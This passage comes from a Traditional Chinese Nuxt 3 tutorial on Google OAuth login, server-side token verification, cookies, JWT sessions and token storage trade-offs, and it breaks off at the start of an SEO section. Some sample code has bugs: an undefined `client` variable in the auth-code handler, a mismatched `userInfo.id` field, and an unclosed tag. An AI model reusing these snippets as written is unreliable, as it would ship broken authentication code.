包裹起來，以確保該元件僅在客戶端做渲染，以免登入按鈕在初始化發生問題。\npages/login.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ClientOnly\u0026gt; \u0026lt;GoogleLogin :callback=\u0026#34;callback\u0026#34; /\u0026gt; \u0026lt;/ClientOnly\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const callback = (response) =\u0026gt; { console.log(response) } \u0026lt;/script\u0026gt; 接著我們啟動 Nuxt 伺服器，這邊我會習慣使用 yarn run dev -- --https 來啟用 HTTPS 做測試，就能發現使用 Google 帳號登入成功後，所返回的 Credential。\nOne Tap prompt 你可以在 \u0026lt;GoogleLogin\u0026gt; 元件添加 prompt 屬性並設為 true，這樣就能同時啟用 Google 一鍵登入 (One Tap prompt) 的功能囉！\n1 \u0026lt;GoogleLogin :callback=\u0026#34;callback\u0026#34; prompt /\u0026gt; 或者也可以在 onMounted 中呼叫 vue3-google-login 的 googleOneTap() 方法，來單獨使用 One Tap prompt。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script setup\u0026gt; import { googleOneTap } from \u0026#39;vue3-google-login\u0026#39; onMounted(() =\u0026gt; { googleOneTap() .then((response) =\u0026gt; { console.log(response) }) .catch((error) =\u0026gt; { console.error(error) }) }) \u0026lt;/script\u0026gt; 自訂按鈕 如果你想自訂登入按鈕的樣式，可以在 \u0026lt;GoogleLogin\u0026gt; 的預設插槽 (Slot) 做建立。\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;GoogleLogin :callback=\u0026#34;callback\u0026#34;\u0026gt; \u0026lt;button\u0026gt;使用 Google 進行登入\u0026lt;/button\u0026gt; \u0026lt;/GoogleLogin\u0026gt; \u0026lt;/template\u0026gt; 使用自訂按鈕會讓 OAuth 流程稍微有點不一樣，當你登入成功後預設會回傳 Auth Code。\n如果設定屬性 popup-type=\u0026quot;TOKEN\u0026quot;，則回傳 Access Token。\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;GoogleLogin :callback=\u0026#34;callback\u0026#34; popup-type=\u0026#34;TOKEN\u0026#34;\u0026gt; \u0026lt;button\u0026gt;使用 Google 進行登入\u0026lt;/button\u0026gt; \u0026lt;/GoogleLogin\u0026gt; \u0026lt;/template\u0026gt; 使用 googleTokenLogin() 在元件中我們也可以自己建立 handleGoogleLogin 點擊事件，呼叫 googleTokenLogin() 方法並傳入設定在 Runtime Config 中的 Google Client ID，這樣點擊登入按鈕就能處理 Google 登入取得 Access Token。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script setup\u0026gt; import { googleTokenLogin } from \u0026#39;vue3-google-login\u0026#39; const runtimeConfig = useRuntimeConfig() const { googleClientId: GOOGLE_CLIENT_ID } = runtimeConfig.public const handleGoogleLogin = () =\u0026gt; { googleTokenLogin({ clientId: GOOGLE_CLIENT_ID }).then((response) =\u0026gt; { console.log(response) }) } \u0026lt;/script\u0026gt; 建立一個登入按鈕來呼叫 handleGoogleLogin 點擊事件。\n1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; @click=\u0026#34;handleGoogleLogin\u0026#34; \u0026gt; 使用 Google 繼續 \u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; 使用 vue3-google-login 提供的 googleTokenLogin() 方法，我們就能取得 Google 使用者的 Access Token 囉！\n使用 googleAuthCodeLogin() 我們也可以使用 googleAuthCodeLogin() 來取得 Auth Code。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script setup\u0026gt; import { googleAuthCodeLogin } from \u0026#39;vue3-google-login\u0026#39; const runtimeConfig = useRuntimeConfig() const { googleClientId: GOOGLE_CLIENT_ID } = runtimeConfig.public const handleGoogleLogin = () =\u0026gt; { googleAuthCodeLogin({ clientId: GOOGLE_CLIENT_ID }).then((response) =\u0026gt; { console.log(response) }) } \u0026lt;/script\u0026gt; 伺服器端驗證 當使用者於前端成功登入後，通常會傳至後端進行登入或記錄使用者，再產生使用於網站的 Token、Cookie 或 Session 等，以供後續的網站驗證做使用。\n我們可使用 google-auth-library 於後端進行一系列的驗證或取得使用者資訊。\n安裝 google-auth-library\n1 2 3 npm install -D google-auth-library # or # yarn add -D google-auth-library 接下來，我們就能依照不同的登入方式取得的 Credential、Access Token 或 Auth Code 送至後端做驗證。\n驗證 Access Token 新增一個 Server API，只接受 POST 方法，在 Body 中夾帶 accessToken 發送至後端。\n建立 ./server/api/auth/google.post.js，內容如下：\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import { OAuth2Client } from \u0026#39;google-auth-library\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const oauth2Client = new OAuth2Client() oauth2Client.setCredentials({ access_token: body.accessToken }) const userInfo = await oauth2Client .request({ url: \u0026#39;https://www.googleapis.com/oauth2/v3/userinfo\u0026#39; }) .then((response) =\u0026gt; response.data) .catch(() =\u0026gt; null) oauth2Client.revokeCredentials() if (!userInfo) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Invalid token\u0026#39; }) } return { id: userInfo.sub, name: userInfo.name, avatar: userInfo.picture, email: userInfo.email, emailVerified: userInfo.email_verified, } }) 調整元件內的登入流程。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;script setup\u0026gt; import { googleTokenLogin } from \u0026#39;vue3-google-login\u0026#39; const runtimeConfig = useRuntimeConfig() const { googleClientId: GOOGLE_CLIENT_ID } = runtimeConfig.public const userInfo = ref() const handleGoogleLogin = async () =\u0026gt; { const accessToken = await googleTokenLogin({ clientId: GOOGLE_CLIENT_ID }).then((response) =\u0026gt; response?.access_token) if (!accessToken) { return \u0026#39;登入失敗\u0026#39; } const { data } = await useFetch(\u0026#39;/api/auth/google\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: { accessToken }, initialCache: false }) userInfo.value = data.value } \u0026lt;/script\u0026gt; 當我們使用 Google OAuth 登入成功後，會取得 Access Token，並將其傳至 Server API，/api/auth/google 接收 Access Token 並使用 Google API 取得使用者的資訊，最後回傳給前端。\n驗證 Credential 在元件中，我們使用的登入方式如果是 Google 渲染的預設按鈕或 One Tap prompt，回傳值就會包含 Credential，我們將就可使用下面修改後的 Server API 進行驗證。\nserver/api/auth/google.post.js 內容修改為如下：\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import { OAuth2Client } from \u0026#39;google-auth-library\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const oauth2Client = new OAuth2Client() const ticket = await oauth2Client.verifyIdToken({ idToken: body.credential, }) const payload = ticket.getPayload() if (!payload) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Invalid token\u0026#39; }) } return { id: payload.sub, name: payload.name, avatar: payload.picture, email: payload.email, emailVerified: payload.email_verified } }) 驗證 Auth Code 我們使用的登入方式如果是呼叫 vue3-google-login 的 googleAuthCodeLogin()，回傳值就會包含 Auth Code，我們就可使用下面修改後的 Server API 進行驗證。\nserver/api/auth/google.post.js 內容修改為如下：\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import { OAuth2Client } from \u0026#39;google-auth-library\u0026#39; export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const oauth2Client = new OAuth2Client({ clientId: \u0026#39;你的 Google Client ID\u0026#39;, clientSecret: \u0026#39;你的 Google Client Secret\u0026#39;, redirectUri: \u0026#39;你的 Google Redirect Uri\u0026#39; }) let { tokens } = await oauth2Client.getToken(body.authCode) client.setCredentials({ access_token: tokens.access_token }) const userInfo = await oauth2Client .request({ url: \u0026#39;https://www.googleapis.com/oauth2/v3/userinfo\u0026#39; }) .then((response) =\u0026gt; response.data) .catch(() =\u0026gt; null) oauth2Client.revokeCredentials() if (!userInfo) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Invalid token\u0026#39; }) } return { id: userInfo.sub, name: userInfo.name, avatar: userInfo.picture, email: userInfo.email, emailVerified: userInfo.email_verified, } }) 以上實現了串接 Google OAuth 登入，並將 Access Token 資訊發送至後端進行驗證，大家可以在依照使用情境自己挑選登入方式及驗證方式，後續也能將使用者資訊儲存到資料庫中，有了資料庫我們就能依照使用者資訊，來比對資料庫進行註冊、驗證登入及產生後續的 Session 或 Cookie 等。\nCookie 的設置與 JWT 的搭配 Cookie 在瀏覽網站時多會使用到，不論是用來儲存臨時的資訊或是辨識使用者等，這一個儲存在瀏覽器的一小段文字資料，會在每次發送 HTTP 請求時自動夾帶，所以 Cookie 最常見的用途就包含了登入狀態、驗證身份等。\n以下將講述在 Nuxt 3 如何設置 Cookie，並結合 JWT (JSON Web Token) 來做一個實際使用者驗證。\nNuxt 3 Cookie 的設置方式 useCookie Nuxt 3 提供了一個組合式函數 useCookie() 來讓我們可以讀寫 Cookie，並且對於 SSR 也有支援，在頁面、元件或插件中，都可以使用 useCookie() 來建立一個 cookie 具有響應性的參考。\n使用方式：\n1 const cookie = useCookie(name, options) name：對應的就是 cookie 的 key。 options：傳入一個物件來設置多個 cookie 屬性： maxAge：指定 Max-Age 屬性的值，單位是秒。如果沒有設置，則這個 cookie 將會是 Session Only，意即網頁關閉後就會消失。 expires：指定一個 Date 物件來作為過期的時間，通常是要相容比較舊的瀏覽器做使用，如果 maxAge 與 expires 屬性都有設定，則過期時間應該要設定為一樣。 httpOnly：是一個布林值，預設為 false，當設置為 true 時，表示客戶端的 JavaScript 將無法使用 document.cookie 來查看這個 cookie。通常是比較敏感或機密的訊息，如 Token 或 Session Id 會設定為 true，只讓瀏覽器發出請求時自動夾帶。 secure：是一個布林值，預設為 false，當設置為 true 時瀏覽器得是 HTTPS 的加密傳輸協定的情境下，才會自動夾帶這個 cookie。 domain：指定 cookie 可以適用的 Domain，通常會保持預設，表示適用於自己的 Domain 之下。 path：指定 cookie 適用的路徑。 sameSite：為一個布林值或是字串，用於設定安全策略。 encode：由於 cookie 的值只能使用有限的字元集，所以這個設置可以將 cookie 編碼成合法的字串值，預設的編碼是使用 JSON.stringify + encodeURIComponent()。 decode：cookie 會經過一個解碼的過程，預設的解碼是使用 decodeURIComponent + destr。 default：為一個函數，可以用於回傳 cookie 的預設值，也可以是回傳一個 Ref。 舉個例子，新增 pages/cookie.vue，內容如下：\npages/cookie.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center justify-center py-12 px-4 sm:px-6 lg:px-8\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;w-full max-w-md\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;mt-2 text-center text-3xl font-bold tracking-tight text-gray-700\u0026#34;\u0026gt;Cookie\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-2 flex w-full max-w-md flex-col items-center\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;mt-2 w-fit rounded-sm bg-emerald-500 py-2 px-4 text-sm text-white hover:bg-emerald-600 focus:outline-none focus:ring-2 focus:ring-emerald-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;setNameCookie\u0026#34; \u0026gt; 設置 name \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;mt-2 flex\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-lg font-semibold text-emerald-500\u0026#34;\u0026gt;name:\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-2 flex text-lg text-slate-700\u0026#34;\u0026gt;{{ name }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-2 flex w-full max-w-md flex-col items-center\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;mt-2 w-fit rounded-sm bg-emerald-500 py-2 px-4 text-sm text-white hover:bg-emerald-600 focus:outline-none focus:ring-2 focus:ring-emerald-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;setCounterCookie\u0026#34; \u0026gt; 設置 counter \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;mt-2 flex\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-lg font-semibold text-emerald-500\u0026#34;\u0026gt;counter:\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-2 flex text-lg text-slate-700\u0026#34;\u0026gt;{{ counter }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const name = useCookie(\u0026#39;name\u0026#39;) const counter = useCookie(\u0026#39;counter\u0026#39;, { maxAge: 60 }) const setNameCookie = () =\u0026gt; { name.value = \u0026#39;Ryan\u0026#39; } const setCounterCookie = () =\u0026gt; { counter.value = Math.round(Math.random() * 1000) } \u0026lt;/script\u0026gt; 我們就可以設置一個只有目前網頁有效的 cookie 名為 name 及一個過期時間為 60 秒後的 counter。\n伺服器端使用 getCookie 與 setCookie 你可以在伺服器端使用 getCookie() 來取得前端夾帶過來的 cookie，也可以使用 setCookie 來設置 cookie 回應給前端。\n舉個例子，新增 server/api/coookie.js，內容如下：\nserver/api/coookie.js 1 2 3 4 5 6 7 8 9 10 export default defineEventHandler((event) =\u0026gt; { let counter = getCookie(event, \u0026#39;counter\u0026#39;) counter = parseInt(counter, 10) || 0 counter += 1 setCookie(event, \u0026#39;counter\u0026#39;, counter) return { counter } }) 當前端打 /api/cookie 這隻 Server API 時，就會自動夾帶瀏覽器中的 cookie，伺服器端收到請求解析 cookie 後得到 counter，將其轉為數值或預設為 0 後增加 1，再重新設定回去給前端。\n使用 Cookie 做使用者驗證 我們可以將 Cookie 的運作機制應用在會員系統當中，使用者登入成功後，後端產生的 Token 或 Session 回傳並儲存在使用者的瀏覽器中，之後的請求將會自動夾帶可以辨識出使用者的 cookie，我們就可以在後端解析或比對 cookie 來驗證使用者的資訊，並依照策略給予不同的處理邏輯。\n我們延續上述的使用 Google OAuth 登入，我們可以在後端實作產生我們自己系統使用的 Token，並設置在 access_token 這個 cookie 之中，後端可以寫如下程式碼，來設置 httpOnly 及 maxAge 過期時間等參數。\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 export default defineEventHandler(async (event) =\u0026gt; { // ... setCookie(event, \u0026#39;access_token\u0026#39;, accessToken, { httpOnly: true, maxAge, expires: new Date(expires * 1000), secure: process.env.NODE_ENV === \u0026#39;production\u0026#39;, path: \u0026#39;/\u0026#39; }) // ... }) 我們使用 jsonwebtoken 產生 JWT，裡面的 Payload 放置了使用者資訊，其中 jwtSignSecret 作為核發 JWT 的簽署金鑰，我們定義在 nuxt.config.ts 中的 runtimeConfig.jwtSignSecret。\n安裝 jsonwebtoken\n1 2 3 npm install jsonwebtoken # or # yarn add jsonwebtoken 完整的 ./server/api/auth/google.post.js 程式碼如下：\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import { OAuth2Client } from \u0026#39;google-auth-library\u0026#39; import jwt from \u0026#39;jsonwebtoken\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const oauth2Client = new OAuth2Client() oauth2Client.setCredentials({ access_token: body.accessToken }) const userInfo = await oauth2Client .request({ url: \u0026#39;https://www.googleapis.com/oauth2/v3/userinfo\u0026#39; }) .then((response) =\u0026gt; response.data) .catch(() =\u0026gt; null) oauth2Client.revokeCredentials() if (!userInfo) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Invalid token\u0026#39; }) } const jwtTokenPayload = { id: userInfo.sub, nickname: userInfo.name, email: userInfo.email } const maxAge = 60 * 60 * 24 * 7 const expires = Math.floor(Date.now() / 1000) + maxAge const jwtToken = jwt.sign( { exp: expires, data: jwtTokenPayload }, runtimeConfig.jwtSignSecret ) setCookie(event, \u0026#39;access_token\u0026#39;, jwtToken, { httpOnly: true, maxAge, expires: new Date(expires * 1000), secure: process.env.NODE_ENV === \u0026#39;production\u0026#39;, path: \u0026#39;/\u0026#39; }) return { id: userInfo.id, nickname: userInfo.name, avatar: userInfo.picture, email: userInfo.email } }) JWT 在核發時使用的加密金鑰，建議使用非對稱式的金鑰進行加密，這邊僅是為了範例展示方便而使用相同的 Secret 進行加解密。\n接著，我們可以實作一個 Server API，./server/api/whoami.js 來從 cookie 得到 access_token，再用 jwt.verify() 方法，來驗證 JTW 後的到使用者資訊。\nserver/api/whoami.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import jwt from \u0026#39;jsonwebtoken\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler((event) =\u0026gt; { const jwtToken = getCookie(event, \u0026#39;access_token\u0026#39;) try { const { data: userInfo } = jwt.verify(jwtToken, runtimeConfig.jwtSignSecret) return { id: userInfo.id, nickname: userInfo.nickname, email: userInfo.email } } catch (e) { throw createError({ statusCode: 401, statusMessage: \u0026#39;Unauthorized\u0026#39; }) } }) 我們在前端，就可以使用 /api/whoami 這隻 API 來得到使用者的資訊囉！\n上圖的流程如下：\n前往登入頁面，並使用 Google 進行登入 登入成功後，打 /api/auth/google API，Body 夾帶 Google OAuth 回傳的 access_token。 /api/auth/google API 回傳後端產生的時效七天的 JWT，並設置於 cookie 的 access_token，並將前端頁面導航至 /whoami 頁面。 在 /whoami 頁面，點擊「打 /api/whoami API」按鈕，送出 /api/whoami API 請求，瀏覽器會自動夾帶 cookie 至後端。 後端 API /api/whoami 收到請求後，從 cookie 中解析出 access_token 的值，並驗證解析出 JWT 內含的使用者資訊，並將其回傳至前端渲染。 pages/whoami.vue 完整程式碼：\npages/whoami.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center justify-center py-12 px-4 sm:px-6 lg:px-8\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;w-full max-w-md\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;mt-6 text-center text-3xl font-bold tracking-tight text-gray-700\u0026#34;\u0026gt;我是誰\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-6 flex w-full max-w-md flex-col items-center\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;mt-2 w-fit rounded-sm bg-emerald-500 py-2 px-4 text-sm text-white hover:bg-emerald-600 focus:outline-none focus:ring-2 focus:ring-emerald-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;whoami\u0026#34; \u0026gt; 打 /api/whoami API \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div v-if=\u0026#34;userInfo\u0026#34; class=\u0026#34;mt-8 flex w-full max-w-md flex-col\u0026#34;\u0026gt; \u0026lt;div v-for=\u0026#34;key in Object.keys(userInfo)\u0026#34; :key=\u0026#34;key\u0026#34; class=\u0026#34;mt-1 flex flex-wrap break-all\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-lg font-semibold text-emerald-500\u0026#34;\u0026gt; {{ key }}:\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-2 flex flex-1 text-lg text-slate-700\u0026#34;\u0026gt;{{ userInfo[key] }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const userInfo = ref() const whoami = () =\u0026gt; { useFetch(\u0026#39;/api/whoami\u0026#39;).then((response) =\u0026gt; { userInfo.value = response.data.value }) } \u0026lt;/script\u0026gt; 至此，我們就實作出一個 Google OAuth 的登入及驗證機制，後續可以再將這些資訊儲存至資料庫之中做後續的使用。\n這個範例的完整程式碼可以參考 Nuxt 3 - 使用 Cookie 與 JWT 做使用者驗證\n小提醒，如果是在伺服器端打 API，可以使用 useRequestHeaders 就可以從伺服器端訪問和代理 cookie 到 API。\n1 2 3 4 5 \u0026lt;script setup\u0026gt; const { data: userInfo } = await useFetch(\u0026#39;/api/whoami\u0026#39;, { headers: useRequestHeaders([\u0026#39;cookie\u0026#39;]) }) \u0026lt;/script\u0026gt; Cookie、LocalStorage、Token 與 JWT 在做使用者驗證的時候，Cookie、LocalStorage、Token 與 JWT 是個重要的概念，這邊稍微簡述一下之間的差異與使用情境。\nCookie 通常採用 Cookie 來驗證使用者時，當使用者登入成功，會由伺服器端產生一組 cookie 來當作後續驗證使用的依據，這個依據會是一個字串形式，瀏覽器每次發送請求時會自動夾帶符合 Domain、路徑設定等的 cookie，伺服器端就可以依據 cookie 來解析驗證這個字串所代表的涵意，例如是不是匹配代表某位使用者字串。\n如同前面的例子，我們將一組能夠代表 Ryan 的 JWT 由登入後產生，並在後續請求中夾帶，以達到驗證使用者的效果。\n這串字串，不一定是要 JWT，只要伺服器端能回推或從資料庫比對出所代表的使用者或特定資訊，那麼也可以是隨意產生的字串。\nLocalStorage LocalStorage 是現今瀏覽器基本上都支援的一個儲存空間，同樣具有 Domain 的寫入與讀取的概念，在 cookie 我們最多只能儲存 4KB 左右的字串資料，但是在 LocalStorage 通常有 5MB 所以能夠儲存更多的資訊。\n也有網站會把驗證使用者的 Token 或憑證依據儲存在 LocalStorage，之後發送請求或需要時再從中拿取出來並手動夾帶出去，同樣也可以實作出驗證使用者的流程。\n在瀏覽器的儲存空間，還有一個 SessionStorage，儲存在這裡面的資料，當網頁關閉時，就會自動清除。與 LocalStorage 不同，除非手動或使用 JS 清除，不然資料永遠存在，也不會有過期時間。\nToken 用於提供給使用者後續夾帶給後端的憑據，相當於一個身分證，Token 通常由字串組成，且需要夠長不容易被暴力嘗試破解，Token 字串通常不具有任何意義，直至後端與資料庫或其他方式比對後，會對應出 Token 所代表的意義，例如使用者資訊。\n通常請求夾帶的 Token，需要每次往快取或資料庫做比對，才能知道 Token 所代表的使用者。\nJWT(JSON Web Token) JWT 是一種開放的標準 RFC 7519，如同名字 JWT 是基於 JSON Object 所編碼出來的，JWT 是由三個部分 Header、Payload 及 Signature 組合而成。\n其中最大的特色就是 Payload 這個部分，當後端伺服器收到 JWT 時，可以從 Payload 解析出當初簽發 JWT 所包含的資訊，通常會在 Payload 放置使用者的相關資料，如 Id、姓名或信箱等，因為這個特色我們不需要再比對快取或資料庫，就可以直接解析出使用者資料。\n而 Payload 這個欄位，因為可以被解碼出來，再任意的修改後重新編碼，所以我們就會借助 Header 及 Signature 這兩個部分，來確認當初加密的演算法及驗證簽章是否符合，以防止 Payload 被任意的竄改。\nToken 或 JWT 選哪一個？ 這兩者之間各有優缺點，雖然自產 Token 需要每次比對資料庫，但是能有效的記錄使用者 Token 核發使用的位置及註銷特定的 Token，因為 JWT 在簽發後，一定得等到過期才會失效無法使用，也就導致 JWT 在核發之後是無法註銷的，除非自己在實作一個黑名單或白名單的機制。\n可以依據使用的情境來決定 Token 或 JWT，只要記得使用 Token 作為解決方案，要保證 Token 足夠複雜或隨機，不容易被推測或暴力嘗試，如果真的要使用比較短的 Token 也確保過期的時間不要設定太長，要頻繁的更換這組 Token 或添加其他驗證機制。\n而 JWT 的利於可以包含 Payload，也切記在後端核發時不要將敏感資料或密鑰夾帶在 Payload 之中，因為 JWT 的 Payload 就算不知道加密的私鑰還是可以被解碼的。而簽發 JWT 選擇加密的方式也盡量採用非對稱式的家姐密，例如使用 ES256 (ECDSA-SHA256) 演算法產生的非對稱金鑰來進行加密。\nToken 要放在 Cookie 還是 LocalStorage？ 後端產生的 Token 或 JWT，不管存放在 Cookie 或 LocalStorage 只要注意其特性及安全，那麼想存在哪裡，都是可以被接受的。\n放在 Cookie 將 Token 存放在 Cookie 的好處，可以用來控制網站的 Domain 或 SubDomain 進行存取，也可以設定過期時間來控制前端是否要重新問後端產生新的 Token，最大的特點就是自動夾帶在每個請求當中，也因為這項特性，有一些資安風險就需要稍微注意一下。\n跨站請求偽造 (Cross Site Request Forgery, CSRF) 就是一個 cookie 使用時所需要注意的資安問題，所以當使用 cookie 作為驗證機制時，建議在敏感的操作上多添加驗證的機制，或使用 CSRF Token 來保護你的 cookie 不被隨意偽造請求的夾帶出去。\n將 Token 或敏感資料儲存在 cooike 時，還是可以透過 JavaScript 的 document.cookie 做存取，所以如果網站有存在跨網站指令碼 (Cross-site scripting, XSS) 的弱點，你的 cookie 很可能就會直接被偷走，為了防止 XSS 弱點導致 cookie 外洩，你可以將 cookie 設值時的屬性 httpOnly 設置為 true，讓客戶端瀏覽器無法直接存取，僅有在發送請求時，由瀏覽器自動夾帶至後端，此外，也可以設置 secure 讓 cookie 只在 HTTPS 下傳輸。\n放在 LocalStorage 關於 Token 是否儲存在 LocalStorage 其實有不同的看法，因為 cookie 存在著 CSRF 或 XSS 等問題需要解決，而存放在 LocalStorage 不僅有更大的空間，還不自帶免疫 CSRF，難道不香嗎？\n但是別忘了 LocalStorage 也是透過 JS 來做儲存與讀取，所以就算使用 LocalStorage 了，但 XSS 弱點如果存在，你的 Token 一樣有外洩的可能性。\n而且 LocalStorage 不具有過期自動刪除的特性，除非自己實作或刪除否則將永遠的存在瀏覽器之中。\n所以？\n網路上有許多使用 Cookie 或 LocalStorage 儲存 Token 說法，有興趣也可以看看兩派各自論述的優缺點，所以，不管是 Cookie 還是 LocalStorage 沒有說一定不能使用誰，而是要依據特性及情境來做使用，並做好定期重新產生及相關的安全配置。\n我自己大概會依照這個網站或服務，是相對簡單也比較不會有會造成悲劇的操作或內容管理為主的服務，我可能就會採用 cookie 的方案處理驗證，因為相對來說自動夾帶與有效期限及 httpOnly 來控制客戶端是否能直接存取，對我來說還是挺方便與安全的，可能在適當的時機再添加 CSRF Token 或多道驗證機制，就能安全的使用 cookie。\n而在多為內部系統使用或是 API 在 Mobile App 甚至是不支援 Cookie 環境之下需要使用 Token 來驗證，我就會採納將 Token 儲存在 LocalStorage。\n搜尋引擎最佳化 (SEO) 與 HTML Meta Tag 選擇使用 Nuxt 3 作為網站開發框架的開發者，多數都是為了要使用 SSR 或 SSG 來加強對 SEO 的優化設置，這篇將會講述 Nuxt 提供的幾個組合式函數，來協助我們設置網頁的標題、內文、Meta 等，以此來設置 SEO 或外部連結可能會解析到的標籤與數值內容。\n搜尋引擎最佳化 (SEO) - 網站的標題 (Title) 與描述 (Description) 當網站需要做搜尋引擎最佳化 (SEO) 的時候，Meta Tag 這個名詞你一定不能忽略，Meta Tag 稱之為元標籤或描述標籤，顧名思義，是來額外描述網頁的資料使用；Meta Tag 通常放置在 HTML 的 中，雖然 Meta Tag 不會直接顯示在網頁上，但對於搜尋引擎的爬蟲來說，是相當重要的一項識別資訊，也是 Facebook 提出的 Open Graph 放置的位置，讓網頁的標題、描述或縮圖等，能正確的被解析顯示出來。\n那麼網頁標題與描述，如果正確設定會有什麼樣子的效果呢？舉例來說，前面的【串接 Google OAuth 登入】我們可以透過網頁原始碼來查看，可以發現 \u0026lt;title\u0026gt; 與 \u0026lt;meta name=\u0026quot;description\u0026quot; … /\u0026gt; 都有設定。\n搜尋引擎爬蟲在收錄網頁時，就會解析這些標籤來建立索引，我們在使用搜尋資料時，網頁的資訊也就對應著顯示出來，如下圖。\n各家的搜尋引擎爬蟲，雖然都有自己解析的規則，不過根據 SEO 的經驗都有大方向能夠依循做建立，此外就是在針對特定的搜尋引擎加強識別標記，遵照官方指引就能讓網站的內容能見度有顯著提升。\n網站的 Open Graph (OG) OG 是由 Facebook 所提出的設定，全名為 Open Graph Protocol，官方翻譯為「開放社交關係圖」，在設定網站的 Meta 時通常也稱 OG Tag，Facebook 提供了網站管理員分享指南，當初設計的目的是，當網頁中設定了 OG Tag，能讓網頁被分享至社群媒體時，能有呈現更為豐富的內容，例如標題、描述及縮圖等。\n舉例來說，當網頁設定了 OG Tag，以連結形式被分享至 Facebook，會呈現如下的資訊，Facebook 會解析網頁內的 OG Tag 將對應的如標題及縮圖等資訊顯示出來。\n其中縮圖依照 Facebook 的指引，即是對應網頁中的 \u0026lt;meta property=\u0026quot;og:image\u0026quot; ... /\u0026gt;。\n不只是在 Facebook 上分享連結會有連結預覽的效果，也因為大家都遵循著 OG Tag 進行設定，所以在其他主流的社群媒體或通訊軟體等也都有跟進解析。例如，我們使用 LINE 傳送一條連結，也會因為設置了 OG Tag 也有成功解析出連結預覽的效果。\nLINE 開發者也有提供一些問答指引可以做參考，連結預覽與 og:title、og:description 和 og:image 有著相應的設定關係。\nuseHead 我們可以使用 Nuxt 3 提供的 useHead() 組合式函數，來設定網站的一些標籤或標記，使用方式如下：\n1 2 3 4 5 6 7 8 9 10 11 